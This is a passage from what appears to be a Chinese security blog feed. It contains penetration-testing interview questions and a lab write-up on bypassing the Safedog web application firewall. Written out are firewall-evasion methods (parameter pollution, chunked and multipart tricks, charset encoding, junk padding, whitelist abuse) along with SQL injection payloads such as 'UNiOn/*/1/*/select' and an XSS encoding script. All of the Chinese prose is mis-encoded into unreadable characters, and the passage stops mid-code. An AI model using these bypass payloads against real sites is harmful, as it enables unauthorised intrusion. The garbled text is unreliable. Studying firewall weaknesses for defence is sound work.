        <content type="html"><![CDATA[<h1 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h1><ul><li>è‡ªæˆ‘ä»‹ç»</li><li>è®²ä¸€ä¸‹ååºåˆ—åŒ–æ¼æ´</li><li>dnslogäº†è§£å—ï¼Œæ˜¯åœ¨å‘½ä»¤æœ‰å›æ˜¾è¿˜æ˜¯æ— å›æ˜¾çš„æ—¶å€™ç”¨</li><li>dnslogå’Œåå¼¹shellæœ‰ä»€ä¹ˆåŒºåˆ«</li><li>ä¸€å¥è¯æœ¨é©¬å’Œå†…å­˜é©¬æœ‰ä»€ä¹ˆåŒºåˆ«</li><li>å¸¸è§çš„wafç»•è¿‡æ–¹å¼</li><li>æ–‡ä»¶ä¸Šä¼ è®²è®²</li><li>é€»è¾‘æ¼æ´çŸ¥é“å“ªäº›</li><li>æœªæˆæƒè®¿é—®æ¼æ´ä½ æ˜¯æ€ä¹ˆæŒ–åˆ°çš„</li><li>sqlæ³¨å…¥ä½ ä¼šç”¨åˆ°å“ªäº›å‡½æ•°</li><li>springæ¡†æ¶æ¼æ´</li><li>é˜¿é‡Œçš„druidäº†è§£å—</li><li>dockerå®¹å™¨æ¼æ´ï¼Œåœ¨å®æˆ˜ä¸­æœ‰é‡è§è¿‡å—</li><li>weblogicæ¡†æ¶æ¼æ´</li><li>çŸ¥é“å“ªäº›CMS</li><li>è‹¥ä¾CMSæ¼æ´çŸ¥é“å—</li><li>2022å¹´ä»¥åçš„æ¼æ´çŸ¥é“å“ªäº›</li><li>ä½ äº†è§£æˆ‘ä»¬å…¬å¸å—</li><li>ä½ æ€ä¹ˆçœ‹å¾…åŠ ç­</li></ul>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wafç»•è¿‡å­¦ä¹ </title>
      <link href="/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="çŸ¥å·±çŸ¥å½¼"><a href="#çŸ¥å·±çŸ¥å½¼" class="headerlink" title="çŸ¥å·±çŸ¥å½¼"></a>çŸ¥å·±çŸ¥å½¼</h2><p><a href="https://www.cnblogs.com/realjimmy/p/12937247.html">WAFåŠŸèƒ½ä»‹ç»ï¼ˆå…¥é—¨æ‰«ç›²ç¯‡ï¼‰ - ä¸€è§‰é†’æ¥å†™ç¨‹åº - åšå®¢å›­</a></p><ul><li>è§„åˆ™å¼•æ“åˆ†ä¸ºä¸¤å—ï¼Œå¯¹è¯·æ±‚è¿‡æ»¤å’Œå¯¹å“åº”è¿‡æ»¤ï¼Œè€Œå¯¹è¯·æ±‚è¿‡æ»¤åˆ†ä¸ºä¸¤å¤§æ­¥ï¼Œç½‘ç»œå±‚è¿‡æ»¤å’Œåº”ç”¨å±‚è¿‡æ»¤ã€‚</li><li>WAFæ¯æ¡è§„åˆ™éƒ½ä¼šé…ç½®åŠ¨ä½œï¼Œå¯¹å‘½ä¸­è§„åˆ™çš„è¯·æ±‚è¿›è¡Œå¯¹åº”çš„å¤„ç†ã€‚</li></ul><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><p><img src="/../images/image-20230516142728508.png" alt="image-20230516142728508"></p><p>æœ¬æ–‡ä»¥å®‰å…¨ç‹—ä¸ºä¾‹å­è¿›è¡Œç®€å•å­¦ä¹ </p><h3 id="éƒ¨ç½²ä½ç½®"><a href="#éƒ¨ç½²ä½ç½®" class="headerlink" title="éƒ¨ç½²ä½ç½®"></a>éƒ¨ç½²ä½ç½®</h3><p><img src="/../images/2015081104292360563.png" alt="enter image description here"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚ â†’ CDN â†’ äº‘waf â†’ ç¡¬waf â†’ WEBæœåŠ¡å™¨ â†’ è½¯waf â†’ WEBåº”ç”¨ç¨‹åºï¼ˆä»£ç wafï¼‰ â†’ (æ•°æ®åº“)</span><br></pre></td></tr></table></figure><h2 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafäº†è§£</span><br><span class="line">å„ç§è¯­æ³•</span><br><span class="line">httpåè®®</span><br><span class="line">webæœåŠ¡å™¨ç‰¹æ€§</span><br></pre></td></tr></table></figure><h2 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h2><h3 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><p>æ²¡æœ‰åœ¨ä»£ç ä¸­è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœ‰ä¼šè¯´æ˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win  10</span><br><span class="line">php  5.6.9</span><br><span class="line">mysql 5.7.26</span><br><span class="line">apache 2.4.39</span><br><span class="line">safe dog V3.5 </span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹</p><p><img src="/../images/image-20230516235356524.png" alt="image-20230516235356524"></p><p><img src="/../images/image-20230516150636839.png" alt="image-20230516150636839"></p><p>ç‰¹å¾</p><p><img src="/../images/image-20230517003655268.png" alt="image-20230517003655268"></p><p><img src="/../images/image-20230517100649383.png" alt="image-20230517100649383"></p><h3 id="è¿‚å›ä½œæˆ˜"><a href="#è¿‚å›ä½œæˆ˜" class="headerlink" title="è¿‚å›ä½œæˆ˜"></a>è¿‚å›ä½œæˆ˜</h3><blockquote><p>ä¸»æ‰“ä¸€ä¸ªä¾§é¢ç»•è¿‡ï¼Œåˆ©ç”¨å„ç§ç¼ºé™·å’Œç‰¹æ€§ä½¿å¾—<strong>wafæ²¡æœ‰è§£æåˆ°payload</strong>ï¼Œä¸ä¸wafçš„è§„åˆ™å’Œç­–ç•¥ç¡¬åˆš</p></blockquote><h4 id="WebæœåŠ¡å™¨ç‰¹æ€§"><a href="#WebæœåŠ¡å™¨ç‰¹æ€§" class="headerlink" title="WebæœåŠ¡å™¨ç‰¹æ€§"></a>WebæœåŠ¡å™¨ç‰¹æ€§</h4><blockquote><p>WebæœåŠ¡å™¨è§£æä¸wafè§£æä¸åŒç»•è¿‡</p></blockquote><h5 id="IIS-ASP"><a href="#IIS-ASP" class="headerlink" title="IIS+ASP"></a>IIS+ASP</h5><ul><li><p><code>%</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹äºURLè¯·æ±‚çš„å‚æ•°å€¼ä¸­çš„%ï¼Œå¦‚æœå’Œåé¢çš„å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²åœ¨URLç¼–ç è¡¨ä¹‹å¤–ï¼ŒASPè„šæœ¬å¤„ç†æ—¶ä¼šå°†å…¶å¿½ç•¥ã€‚</span><br><span class="line"></span><br><span class="line">select  â†’  se%lect</span><br></pre></td></tr></table></figure></li><li><p><code>unicode</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IISä¼šè‡ªåŠ¨è§£ç unicode</span><br></pre></td></tr></table></figure></li></ul><h5 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><h5 id="å‚æ•°æ±¡æŸ“"><a href="#å‚æ•°æ±¡æŸ“" class="headerlink" title="å‚æ•°æ±¡æŸ“"></a>å‚æ•°æ±¡æŸ“</h5><p>ä¼ é€’å¤šä¸ªç›¸åŒå‚æ•°ï¼Œåˆ©ç”¨wafå’ŒwebæœåŠ¡å™¨è§£æçš„å‚æ•°ä¸åŒæ¥è¿›è¡Œç»•è¿‡</p><table><thead><tr><th align="left">Web ç¯å¢ƒ</th><th align="left">å‚æ•°è·å–å‡½æ•°</th><th align="left">è·å–åˆ°çš„å‚æ•°</th></tr></thead><tbody><tr><td align="left">PHP&#x2F;Apache</td><td align="left">$_GET(â€œparâ€)</td><td align="left">last</td></tr><tr><td align="left">JSP&#x2F;Tomcat</td><td align="left">Request.getParameter(â€œparâ€)</td><td align="left">first</td></tr><tr><td align="left">Perl(CGI)&#x2F;Apache</td><td align="left">Param(â€œparâ€)</td><td align="left">first</td></tr><tr><td align="left">Python&#x2F;Apache</td><td align="left">getvalue(â€œparâ€)</td><td align="left">[â€œfirstâ€,â€lastâ€]</td></tr><tr><td align="left">ASP.NET&#x2F;IIS</td><td align="left">Request.QueryString(â€œparâ€)</td><td align="left">first,last</td></tr></tbody></table><h4 id="Webåº”ç”¨ç¨‹åºå±‚"><a href="#Webåº”ç”¨ç¨‹åºå±‚" class="headerlink" title="Webåº”ç”¨ç¨‹åºå±‚"></a>Webåº”ç”¨ç¨‹åºå±‚</h4><blockquote><p>Webåº”ç”¨ç¨‹åºå±‚ï¼ˆåç«¯ä»£ç ï¼‰è§£æä¸wafè§£æä¸åŒ</p><p><strong>wafæ²¡æœ‰æ ¹æ®åç«¯ä»£ç æ¥ä¿®æ”¹ç­–ç•¥å’Œè§„åˆ™</strong></p></blockquote><h5 id="ç¼–ç "><a href="#ç¼–ç " class="headerlink" title="ç¼–ç "></a>ç¼–ç </h5><p>å¯¹è¯·æ±‚æ•°æ®è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚urlç¼–ç ï¼ŒUnicodeç¼–ç ç­‰ï¼Œå¦‚æœwafå¯¹æ•°æ®ä¸èƒ½æœ‰æ•ˆçš„è§£ç ï¼Œè€Œåº”ç”¨åç«¯èƒ½å¤Ÿæ­£å¸¸è§£ç ï¼Œå°±å¯ä»¥ç»•è¿‡wafã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jsonæ•°æ®æ”¯æŒunicodeç¼–ç </span><br></pre></td></tr></table></figure><h5 id="å¤šæ•°æ®æ¥æº"><a href="#å¤šæ•°æ®æ¥æº" class="headerlink" title="å¤šæ•°æ®æ¥æº"></a>å¤šæ•°æ®æ¥æº</h5><p>webåº”ç”¨ç¨‹åºä»å¤šä¸ªåœ°æ–¹å–å€¼ï¼Œå¦‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;xxxx&#x27;</span>]</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»<code>GET,POST,HEADER,METHOD</code>ç­‰åœ°æ–¹è·å–ç”¨æˆ·æäº¤çš„å‚æ•°ã€‚</p><p>å¦‚æœwafåªå¯¹<code>GETï¼ŒPOST</code>è¿›è¡Œæ£€æµ‹,æ²¡æœ‰ä¸åç«¯ç›¸é€‚åº”ï¼Œå°±å¯ä»¥ç»•è¿‡ã€‚</p><h4 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h4><h5 id="åˆ†å—ä¼ è¾“"><a href="#åˆ†å—ä¼ è¾“" class="headerlink" title="åˆ†å—ä¼ è¾“"></a>åˆ†å—ä¼ è¾“</h5><p>Burpæ’ä»¶ï¼š<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: chunked  <span class="comment"># è¡¨ç¤ºBODYçš„ä¼ è¾“ç¼–ç æ–¹å¼ä¸ºchunkedï¼ˆæ— Content-Lengthå­—æ®µï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="comment"># æŒ‡æ˜ä¼ è¾“çš„æ•°æ®é•¿åº¦</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="comment"># è¡¨ç¤ºä¼ è¾“ç»“æŸ</span></span><br></pre></td></tr></table></figure><p>å®éªŒ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>] å¤±è´¥</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>] æˆåŠŸ</span><br></pre></td></tr></table></figure><h5 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h5><p>httpé•¿è¿æ¥ï¼Œå‘é€å¤šä¸ªæ•°æ®åŒ…è¯·æ±‚ï¼Œæ„Ÿè§‰è·Ÿè¯·æ±‚èµ°ç§å¾ˆåƒ</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><p>éœ€è¦å…³é—­</p><p><img src="/../images/image-20230517113339255.png" alt="image-20230517113339255"></p><h5 id="multipart-x2F-form-data"><a href="#multipart-x2F-form-data" class="headerlink" title="multipart&#x2F;form-data"></a>multipart&#x2F;form-data</h5><p><strong>æ¨èé˜…è¯»</strong></p><p><a href="http://www.moonslow.com/article/tencent_waf_bypass">http://www.moonslow.com/article/tencent_waf_bypass</a></p><blockquote><p><strong>æƒ³åŠæ³•è®©WAFä»¥ä¸ºæˆ‘ä»¬æ˜¯åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œå®é™…ä¸Šå´æ˜¯åœ¨POSTä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥æ˜¯å‘½ä»¤æ³¨å…¥ã€SQLæ³¨å…¥ã€SSRFç­‰ä»»æ„çš„ä¸€ç§æ”»å‡»ï¼Œè¿™æ ·å°±å®ç°äº†é€šç”¨WAF Bypass</strong></p><p>ä½•æ—¶æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Ÿä½•æ—¶æ˜¯POSTå‚æ•°å‘¢ï¼Ÿè¿™ä¸ªå…³é”®ç‚¹åœ¨äºæœ‰æ²¡æœ‰ä¸€ä¸ªå®Œæ•´çš„ï¼Œè¿ç»­çš„**filename&#x3D;**ï¼Œä¸­é—´å¯ä»¥æ’å…¥<code>\r\n</code>æˆ–è€…<code>\n</code></p></blockquote><p><img src="/../images/image-20230518163001348.png" alt="image-20230518163001348"></p><h5 id="ç•¸å½¢è¯·æ±‚æ–¹æ³•"><a href="#ç•¸å½¢è¯·æ±‚æ–¹æ³•" class="headerlink" title="ç•¸å½¢è¯·æ±‚æ–¹æ³•"></a>ç•¸å½¢è¯·æ±‚æ–¹æ³•</h5><p>æŠ“åŒ…ï¼Œç„¶åä¿®æ”¹è¯·æ±‚æ–¹æ³•</p><h5 id="chrestç¼–ç "><a href="#chrestç¼–ç " class="headerlink" title="chrestç¼–ç "></a>chrestç¼–ç </h5><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>charest=cp037</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ibm869</span><br><span class="line">ibm870</span><br><span class="line">ibm871</span><br><span class="line">ibm918</span><br><span class="line">iso-2022-cn</span><br><span class="line">iso-2022-jp</span><br><span class="line">iso-2022-jp-2</span><br><span class="line">iso-2022-kr</span><br><span class="line">iso-8859-1</span><br><span class="line">iso-8859-13</span><br><span class="line">iso-8859-15</span><br></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line">payload = <span class="string">&#x27;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span> </span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote_plus(payload.encode(<span class="string">&quot;IBM037&quot;</span> )))</span><br></pre></td></tr></table></figure><h4 id="wafç‰¹æ€§"><a href="#wafç‰¹æ€§" class="headerlink" title="wafç‰¹æ€§"></a>wafç‰¹æ€§</h4><blockquote><p>éƒ¨ç½²æ–¹å¼ï¼Œç­–ç•¥ä¸è§„åˆ™ç¼ºé™·</p></blockquote><h5 id="äº‘waf"><a href="#äº‘waf" class="headerlink" title="äº‘waf"></a>äº‘waf</h5><p><img src="/../images/zh-cn_image_0000001193876233.png" alt="img"></p><p>â€‹é€šè¿‡æ”¹å˜ç”¨æˆ·åŸŸåçš„DNSè§£æåœ°å€æ¥å°†Webæµé‡ç‰µå¼•åˆ°äº‘WAFå¼•æ“é›†ç¾¤ï¼Œç»è¿‡æ£€æµ‹åå†å›æºè‡³çœŸæ­£çš„WebæœåŠ¡å™¨ã€‚</p><p><img src="/../images/zh-cn_image_0000001159784637.png" alt="img"></p><p>â€‹æ‰€ä»¥å¦‚æœå¯ä»¥æ‰¾åˆ°ç›®æ ‡çš„çœŸå®ipï¼Œå°±å¯ä»¥ç»•è¿‡äº‘wafã€‚</p><h5 id="æ€§èƒ½ç¼ºé™·"><a href="#æ€§èƒ½ç¼ºé™·" class="headerlink" title="æ€§èƒ½ç¼ºé™·"></a>æ€§èƒ½ç¼ºé™·</h5><h6 id="é«˜å¹¶å‘"><a href="#é«˜å¹¶å‘" class="headerlink" title="é«˜å¹¶å‘"></a>é«˜å¹¶å‘</h6><p>ç”¨Burpçš„<code>Trubo Intruder</code>æ’ä»¶,å¤±è´¥</p><p>è€Œä¸”é«˜å¹¶å‘å¾ˆå¯èƒ½ä¼šé€ æˆä¸šåŠ¡ç³»ç»Ÿå‡ºç°é—®é¢˜ã€‚</p><h6 id="è„æ•°æ®"><a href="#è„æ•°æ®" class="headerlink" title="è„æ•°æ®"></a>è„æ•°æ®</h6><p>ä¸ºäº†é˜²æ­¢æ¶ˆè€—å¤ªå¤šçš„CPUã€å†…å­˜èµ„æºï¼Œå› æ­¤è®¸å¤šWAFåªæ£€æµ‹å‰é¢çš„2Mæˆ–4Mçš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡å¡«å……åƒåœ¾æ•°æ®è¿›è¡Œç»•è¿‡ã€‚</p><h6 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516150951130.png" alt="image-20230516150951130"></p><p>å®‰å…¨ğŸ•åœ¨<code>HTTP BODY</code>ä¸­æ£€æµ‹åˆ°äº†å…³é”®å­—ï¼Œç›´æ¥è¿”å›500ã€‚ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">a<span class="operator">=</span><span class="number">8172</span><span class="operator">*</span>A<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516151625299.png" alt="image-20230516151625299"></p><h6 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h6><p><code>waf</code>å¯èƒ½ç›´æ¥æ£€æµ‹é•¿åº¦æ¥æ‹¦æˆª</p><p>å¦‚å®‰å…¨ğŸ•,<code>GET</code>ä¸‹æ˜¯ä¸è¡Œçš„</p><p><img src="/../images/image-20230516151807403.png" alt="image-20230516151807403"></p><h5 id="ç™½åå•æœºåˆ¶"><a href="#ç™½åå•æœºåˆ¶" class="headerlink" title="ç™½åå•æœºåˆ¶"></a>ç™½åå•æœºåˆ¶</h5><ul><li><p>æ–‡ä»¶ç™½åå•</p><blockquote><p>ä¸€äº› WAF ä¸ºäº†ä¿è¯æ ¸å¿ƒåŠŸèƒ½å¦‚ç™»é™†åŠŸèƒ½æ­£å¸¸ï¼Œä¼šåœ¨å†…éƒ¨è®¾ç«‹ä¸€ä¸ªæ–‡ä»¶ç™½åå•ï¼Œæˆ–å†…å®¹ç™½åå•ï¼Œåªè¦å’Œè¿™äº›æ–‡ä»¶æˆ–å†…å®¹æœ‰å…³ï¼Œæ— è®ºæ€ä¹ˆæµ‹è¯•ï¼Œéƒ½ä¸ä¼šè¿›è¡Œæ‹¦æˆªã€‚</p><p>å¦‚ï¼šWAF è®¾ç«‹äº†ç™½åå•<code>/admin</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æµ‹è¯• payload å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ‰‹æ³•æ¥ç»•è¿‡</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŸæ¥è¢«æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># ç°åœ¨ä¸æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?a=/admin&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure></li><li><p>IPç™½åå•</p><blockquote><p>åç«¯é€šè¿‡Headerå­—æ®µè·å–æºIP</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FORç­‰</span><br></pre></td></tr></table></figure></li><li><p>UAç™½åå•</p><blockquote><p>æŸäº›WAFå¯èƒ½ä¸ºäº†ä¸å½±å“ç«™ç‚¹çš„SEOä¼˜åŒ–ï¼Œå°†User-Agentä¸ºæŸäº›æœç´¢å¼•æ“ï¼ˆå¦‚è°·æ­Œï¼‰çš„è¯·æ±‚å½“ä½œç™½åå•å¤„ç†ï¼Œä¸æ£€æµ‹å’Œæ‹¦æˆªã€‚</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">User-Agent</span><br></pre></td></tr></table></figure><p>UAæ”¶é›†ï¼š<a href="https://www.0735.pro/archives/study/51.html">https://www.0735.pro/archives/study/51.html</a></p></li></ul><h5 id="é™æ€æ–‡ä»¶ç»•è¿‡"><a href="#é™æ€æ–‡ä»¶ç»•è¿‡" class="headerlink" title="é™æ€æ–‡ä»¶ç»•è¿‡"></a>é™æ€æ–‡ä»¶ç»•è¿‡</h5><p>ä¸€äº› WAF ä¸ºäº†å‡å°‘æœåŠ¡å™¨çš„å‹åŠ›ï¼Œä¼šå¯¹é™æ€æ–‡ä»¶å¦‚<code>.png</code>ã€<code>.css</code>ç­‰ç›´æ¥æ”¾è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ªè£…æˆé™æ€æ–‡ä»¶æ¥ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŸæ¥è¢«æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># ç°åœ¨ä¸æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?1.jpg&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure><h5 id="è¯·æ±‚æ–¹å¼"><a href="#è¯·æ±‚æ–¹å¼" class="headerlink" title="è¯·æ±‚æ–¹å¼"></a>è¯·æ±‚æ–¹å¼</h5><ol><li>ä¸€äº› WAF å¯¹äº<code>get</code>è¯·æ±‚å’Œ<code>post</code>è¯·æ±‚çš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ï¼Œå¯èƒ½å¯¹ POST è¯·æ±‚ç¨åŠ æ¾æ‡ˆï¼Œå› æ­¤ç»™<code>GET</code>è¯·æ±‚å˜æˆ<code>POST</code>è¯·æ±‚æœ‰å¯èƒ½ç»•è¿‡æ‹¦æˆªã€‚</li><li>ä¸€äº› WAF æ£€æµ‹åˆ°<code>POST</code>è¯·æ±‚åï¼Œå°±ä¸ä¼šå¯¹<code>GET</code>æºå¸¦çš„å‚æ•°è¿›è¡Œè¿‡æ»¤æ£€æµ‹ï¼Œå› æ­¤å¯¼è‡´è¢«ç»•è¿‡ã€‚</li></ol><h5 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h5><blockquote><p>fuzzå¤§æ³•ï¼Œä½¿ç”¨è„šæœ¬å»æ¢æµ‹WAFè®¾å¤‡å¯¹äºå­—ç¬¦å¤„ç†æ˜¯å¦æœ‰å¼‚å¸¸ï¼Œä¸€äº›WAFå¯èƒ½ç”±äºè‡ªèº«çš„è§£æé—®é¢˜ï¼Œå¯¹äºæŸäº›å­—ç¬¦è§£æå‡ºé”™ï¼Œé€ æˆå…¨å±€çš„bypass</p></blockquote><p>æµ‹è¯•ç‚¹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1ï¼‰ï¼šgetè¯·æ±‚å¤„ </span><br><span class="line">2ï¼‰ï¼šheaderè¯·æ±‚å¤„ </span><br><span class="line">3ï¼‰ï¼špost urlencodeå†…å®¹å¤„ </span><br><span class="line">4ï¼‰ï¼špost form-dataå†…å®¹å¤„</span><br></pre></td></tr></table></figure><p>åŸºç¡€å†…å®¹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1ï¼‰ç¼–ç è¿‡çš„0-255å­—ç¬¦ </span><br><span class="line">2ï¼‰è¿›è¡Œç¼–ç çš„0-255å­—ç¬¦ </span><br><span class="line">3ï¼‰utf gbkå­—ç¬¦</span><br></pre></td></tr></table></figure><h3 id="æ­£é¢ç¡¬åˆš"><a href="#æ­£é¢ç¡¬åˆš" class="headerlink" title="æ­£é¢ç¡¬åˆš"></a>æ­£é¢ç¡¬åˆš</h3><blockquote><p>å¢å¢æ”¹æ”¹æ··æ·†è§†å¬ï¼Œä½¿wafçš„è§„åˆ™å’Œç­–ç•¥å¤±æ•ˆ</p><p><strong>åŸºæœ¬æ–¹é’ˆ</strong>ï¼š</p><ol><li>å¢åˆ æµ‹è¯•wafå®¹å¿åº¦ï¼Œç¡®è®¤å…³é”®ç‚¹</li><li>æœ¬åœ°FUZZ PAYLOAD,å…ˆä¿è¯å¯ä»¥ç»•è¿‡æ£€æµ‹</li><li>å†æ¬¡è¿›è¡Œæ„é€ ä½¿å¾—åç«¯èƒ½å¤Ÿè¿›è¡Œè§£æ</li></ol></blockquote><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>ç®€å•fuzz</p><p><img src="/../images/image-20230517001306283.png" alt="image-20230517001306283"></p><p>å¯ä»¥å‘ç°ä¸ä¼šå¯¹å•ä¸€çš„å…³é”®å­—è¿›è¡Œè¿‡æ»¤ï¼Œä¼šå¯¹ä¸€äº›ç»„åˆè¿›è¡Œè¿‡æ»¤</p><h5 id="union-selectç»•è¿‡"><a href="#union-selectç»•è¿‡" class="headerlink" title="union selectç»•è¿‡"></a><code>union select</code>ç»•è¿‡</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union (select)</span><br><span class="line">UNiOn/*/1/*/select</span><br><span class="line">UNiOn--+%02%0d%0aselect    #æ³¨é‡Šæ¢è¡Œ</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154023102.png" alt="image-20230516154023102"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154137250.png" alt="image-20230516154137250"></p><p>åœ¨<code>/**/</code>ä¸­æ’å…¥<code>/x/</code>å³å¯ï¼Œxè‡³å°‘ä¸ºä¸€ä¸ªå­—ç¬¦</p><h5 id="å‡½æ•°ç»•è¿‡"><a href="#å‡½æ•°ç»•è¿‡" class="headerlink" title="å‡½æ•°ç»•è¿‡"></a>å‡½æ•°ç»•è¿‡</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221518813.png" alt="image-20230516221518813"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database<span class="comment">/**/</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221551123.png" alt="image-20230516221551123"></p><p>FUZZç»“æœ</p><p><img src="/../images/image-20230517000942363.png" alt="image-20230517000942363"></p><p><img src="/../images/image-20230517000931846.png" alt="image-20230517000931846"></p><h5 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a><code>select from</code></h5><p>ç¡¬åˆšG</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 